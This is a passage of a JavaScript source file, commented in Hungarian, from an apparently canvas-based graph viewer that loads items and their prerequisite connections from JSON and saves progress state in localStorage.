	 * Állapotkód alapján állapot helyreállítása
	 *
	 * @method unserialize
	 * @param {String} data Állapotkód
	 */
	this.unserialize = function(data){
		items.unserialize(data);
	}

	EventBus.addEventListener("redrawItem",       this.redrawEventHandler, this);
	EventBus.addEventListener("clearCursor",      this.clearCursorEventHandler, this);
	EventBus.addEventListener("clearHighlights",  this.clearHighlightsEventHandler, this);
	EventBus.addEventListener("clearFollows",     function(a,b){this.clearFollows(b);}, this);
	EventBus.addEventListener("hoveredEvent",     function(a,b){this.hovered(b);}, this);
	EventBus.addEventListener("publicClickEvent", function(e, item, eventarg){ this.click(item, eventarg); }, this);

	EventBus.addEventListener("redrawAll", function(){
		ctx.clearRect(0,0,canvas.width, canvas.height);

		items.refresh();

		this.draw();
	}, this);

	/**
	 * Publikus kattintás esemény.
	 *
	 * @method click
	 * @param {Object} item Kattintott elem
	 * @param {Object} eventarg
	 */
	this.click = function(item, eventarg){};

	/**
	 * Publikus hover esemény
	 *
	 * @method click
	 * @param {Object} item Egér alatt lévő elem
	 */
	this.hovered = function(item){};

	/**
	 * Tömeges adathozzáadás
	 *
	 * @method addJSON
	 * @param {Object} data Adatokat tartalmazó JSON objektum
	 * @param {Boolean} [clear=true] Törölje-e az előzőleg hozzáadott elemeket
	 */
	this.addJSON = function(data, clear){
		
		if(data.items == undefined || data.items.length == 0){
			
			return;
		}

		if(clear == undefined){
			clear = true;
		}

		if(clear == true){
			items.clear();
		}

		currentID = data.id;

		
		var length = data.items.length;
		for(var i = 0; i < length; i++){
			items.addItem(data.items[i]);
		}
		

		
		var length = data.connections.length;
		for(var i = 0; i < length; i++){
			if(data.connections[i].needed instanceof Array){
				var connlength = data.connections[i].needed.length;
				for(var j = 0; j < connlength; j++){
					items.addConnection(data.connections[i].item, data.connections[i].needed[j]);
				}
			}else{
				items.addConnection(data.connections[i].item, data.connections[i].needed);
			}
		}
		

		
		var oldSettings = localStorage.getItem(currentID);
		if(oldSettings != undefined &&  oldSettings.length > 0){
			items.unserialize(oldSettings);
		}
		

		
		if(data.conversion != undefined){
			var cache = [];

			for(var i = 0, length = data.conversion.length; i < length; i++){
				var item   = data.conversion[i],
				    needed = item.needed;

				for(var j = 0, l = needed.length; j < l; j++){
					var stored;
					if(cache[needed[j].id] == undefined){
						stored = localStorage.getItem(needed[j].id);
						if(stored != undefined){
							cache[needed[j].id] = coder.decode(stored).split("|");
						}
					}

					stored      = cache[needed[j].id];
					var deps    = needed[j].items,
					    hasAlts = true;

					for(var k = 0, le = deps.length; k < le; k++){
						if(stored.indexOf(deps[k]) < 0){
							hasAlts = false;
							break;
						} 
					}

					if(hasAlts){
						items.getItemById(item.id).properties.status = "completted";
						break;
					}
				}
			}
			
			items.refresh();
		}

		this.click();
		
	}

	/**
	 * Elemek lekérdezése. Hozzáfűződik egy 'active' érték attól függően, hogy teljesített-e vagy sem.
	 *
	 * @method getItems
	 * @return {Array} Elemek listája
	 */
	this.getItems = function(){
		var itemList   = items.getItems(),
			returnList = new Array(),
			length     = itemList.length;

		for(var i = 0; i < length; i++){
			var clone    = JSON.parse(JSON.stringify(itemList[i]));
			clone.active = itemList[i].properties.status == "completted" ? true : false;
			delete clone.properties;

			returnList.push(clone);
		}

		return returnList;
	}

	/**
	 * Összeállítás törlése, elemek alapállapotba helyezése.
	 *
	 * @method clearSelection
	 */
	this.clearSelection = function(){
		localStorage.removeItem(currentID);
		items.clearSelection();
	}

}